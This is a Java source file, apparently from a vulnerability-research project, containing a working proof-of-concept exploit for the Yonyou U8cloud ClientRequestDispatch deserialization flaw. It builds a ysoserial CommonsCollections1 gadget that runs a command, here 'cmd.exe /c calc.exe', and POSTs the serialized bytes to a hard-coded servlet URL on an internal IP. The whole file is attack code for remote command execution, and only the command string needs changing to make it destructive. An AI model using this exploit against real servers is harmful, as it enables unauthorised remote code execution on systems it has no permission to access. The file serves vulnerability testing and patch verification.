package cve;

import com.pacemrc.vuldebug.common.utils.HttpRequest;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;


/**
 * U8cloud所有版本ClientRequestDispatch反序列化漏洞
 * https://security.yonyou.com/#/patchInfo?foreignKey=33a417377013454099efa313fc9fcf89
 */
public class rce3 {

    private static byte[] serializeObject(Object obj) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(obj);
            oos.flush();
            return bos.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201:8088/servlet/~iufo/nc.ui.iufo.jiuqi.ClientRequestDispatch";
        String gadget = "CommonsCollections1";
        String cmd = "cmd.exe /c calc.exe";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        byte[] bytes = serializeObject(obj);

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendByteArrayPost(httpPost, bytes);

    }
}


